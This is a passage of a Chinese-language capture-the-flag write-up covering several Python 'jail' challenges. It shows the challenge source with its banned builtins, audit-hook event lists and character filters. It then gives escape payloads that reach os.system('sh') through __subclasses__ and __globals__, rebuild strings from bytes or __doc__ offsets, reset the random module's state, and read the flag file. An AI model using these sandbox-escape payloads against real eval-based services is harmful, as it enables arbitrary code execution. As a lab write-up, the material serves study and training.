class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;print&#x27;</span>]</span><br><span class="line"></span><br><span class="line">exec_func = <span class="built_in">exec</span></span><br><span class="line">compile_func = <span class="built_in">compile</span></span><br><span class="line">print_func = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line">flag = load_flag.get_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ _____ __</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | | ____/_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    print_func(WELCOME)</span><br><span class="line">    print_func(<span class="string">&quot;It&#x27;s so easy challenge!&quot;</span>)</span><br><span class="line">    print_func(<span class="string">&quot;Seems flag into the dir()&quot;</span>)</span><br><span class="line">    repl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    my_global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    my_global_dict[<span class="string">&#x27;my_flag&#x27;</span>] = flag</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = compile_func(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    exec_func(complie_code, my_global_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="lak3-lak3-lak3">lak3 lak3 lak3</h4>
<p>“laKe laKe laKe have some interesting sol</p>
<p>But now lak3 lak3 lak3 is back</p>
<p>G00d luck! Hackers</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Hi hackers,lak3 comes back</span></span><br><span class="line"><span class="comment">#Have a good luck on it! :Wink:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [<span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line">open_func = <span class="built_in">open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BLACKED_LIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>,<span class="string">&#x27;code.__new__&#x27;</span>,<span class="string">&#x27;function.__new__&#x27;</span>,<span class="string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="string">&#x27;open&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br><span class="line"></span><br><span class="line">WELCOME=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _    ____    _       _    ____    _       _    ____  </span></span><br><span class="line"><span class="string"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ </span></span><br><span class="line"><span class="string"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |</span></span><br><span class="line"><span class="string"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; </span></span><br><span class="line"><span class="string"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ </span></span><br><span class="line"><span class="string">                                                                                                                                                                       </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome to my guesser game!&#x27;</span>)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    <span class="keyword">if</span> game_score == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you are really super guesser!!!!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guess game end!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>跟前面那个题似乎类似，因为我们的方法并没有使用任何的RCE技巧，所以尝试了一下用相同的方法，直接过了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can u guess the number? between 1 and 9999999999999 &gt; [random := __import__(<span class="string">&quot;random&quot;</span>), random.setstate((<span class="number">3</span>, tuple(list(random.getstate()[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), None)), random.randint(1, 9999999999999)][-1]</span><br><span class="line">you are really super guesser!!!!</span><br><span class="line">NSSCTF&#123;9df8e5bc-d76d-4d80-a437-9fccefcbd58d&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tyPe-Ch-nnEl">tyPe Ch@nnEl</h4>
<p>给出了源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MY_FLAG = <span class="string">&quot;NSSCTF&#123;fake_flag_in_local_but_really_in_The_remote&#125;&quot;</span></span><br><span class="line">BLACED_KLIST = <span class="string">&#x27;&quot;%&amp;\&#x27;,-/_:;@\\`&#123;|&#125;~*&lt;=&gt;[] \t\n\r&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_safe_check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="built_in">ord</span>(m) &lt; <span class="number">0x7f</span> <span class="keyword">for</span> m <span class="keyword">in</span> n) <span class="keyword">and</span> <span class="built_in">all</span>(m <span class="keyword">not</span> <span class="keyword">in</span> n <span class="keyword">for</span> m <span class="keyword">in</span> BLACED_KLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_safe_eval</span>(<span class="params">m, my_func</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> my_safe_check(m):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hacker!!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;my_func.__name__&#125;</span>(<span class="subst">&#123;m&#125;</span>)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;my_func.__name__: my_func&#125;, <span class="string">&quot;flag&quot;</span>: MY_FLAG&#125;))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_safe_eval(<span class="built_in">input</span>(<span class="string">&quot;Payload:&quot;</span>), <span class="built_in">type</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单了解一下python里的<code>all()</code>的用法：</p>
<p><code>all(Iterable)</code>在可迭代对象中如果每一个值都为True那么<code>all()</code>也返回布尔值True。</p>
<p>如果可迭代对象是空的那么也返回True。</p>
</blockquote>
<h4 id="calc-jail-beginner-level4">calc_jail_beginner_level4</h4>
<p>So cool that u finished the week1 challenge</p>
<p>No dangerous password no chr try to hack me!!!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |  </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                      </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                                                             </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eval_func(input_data)))</span><br></pre></td></tr></table></figure>
<p>看了一下被禁用的内容，不影响使用Show subclasses with tuple：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>找到<code>&lt;class 'os._wrap_close'&gt;</code>在倒数第四个，拿出payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意这题还ban掉了单引号双引号反引号，将payload里的两个字符串改一下bytes型：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](<span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当然，方法总部困难多，如果bytes型这种也不让使用的话，还有一种比较巧妙的方法，就是从魔术方法的文档里去找字符然后进行拼接：</p>
<p><code>__doc__</code>魔术方法能从默认的类里找到相对应的文档，例如<code>().__doc__</code>就是tuple类的文档，输出：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Built-in immutable sequence.</span><br><span class="line"></span><br><span class="line">If no argument is given, the constructor returns an empty tuple.</span><br><span class="line">If iterable is specified the tuple is initialized from iterable&#x27;s items.</span><br><span class="line"></span><br><span class="line">If the argument is a tuple, the return value is the same object. </span><br></pre></td></tr></table></figure>
<p>返回了一段字符串文字，可以从里面找到我们需要的字母的偏移量，然后拿来用偏移量表示字符即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 19</span></span><br></pre></td></tr></table></figure>
<p>下次想使用字符<code>s</code>的时候，直接使用<code>().__doc__[19]</code>即可。只要我们选择的文档里面有足够多的字母，那么就可以得到想要的字母。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">4</span>]+().__doc__[<span class="number">17</span>]+().__doc__[<span class="number">10</span>]](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>事实上，通过ls发现flag文件就叫flag，在已知flag文件名字的前提下，可以直接使用<code>open('flag').read()</code>去改写，两种方法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]).decode()).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print([().__doc__.find(&#x27;f&#x27;),().__doc__.find(&#x27;l&#x27;),().__doc__.find(&#x27;a&#x27;),().__doc__.find(&#x27;g&#x27;)])</span></span><br><span class="line"><span class="built_in">open</span>(().__doc__[<span class="number">31</span>]+().__doc__[<span class="number">3</span>]+().__doc__[<span class="number">14</span>]+().__doc__[<span class="number">38</span>]).read()</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-0-5">calc_jail_beginner_level4.0.5</h4>
<p>So cool that u finished the week1 challenge Let’s 4.0.5</p>
<p>No dangerous password no chr try to hack me!!!</p>
<p>没有附件：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,&quot;,&#x27; Good luck!</span><br></pre></td></tr></table></figure>
<p>尝试同样用上面的方法直接过了，获取一下源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_0002321 = <span class="built_in">eval</span></span><br><span class="line">my_input_func_2309121 = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _    ___   _____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,\&quot;,&#x27; Good luck!&quot;</span>)</span><br><span class="line">input_data = my_input_func_2309121(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_0002321(input_data)))</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-1">calc_jail_beginner_level4.1</h4>
<p>So cool that u finished the 4.0 challenge</p>
<p>but now u can read file</p>
<p>也没有附件：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27; Good luck!</span><br></pre></td></tr></table></figure>
<p>用level4的做法还是可以，注意这题已经把<code>bytes</code>给ban掉了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">4</span>]+().__doc__[<span class="number">17</span>]+().__doc__[<span class="number">10</span>]](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>
<p>而且这题flag文件名字也改了，所以投机取巧的方法也不成功。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span 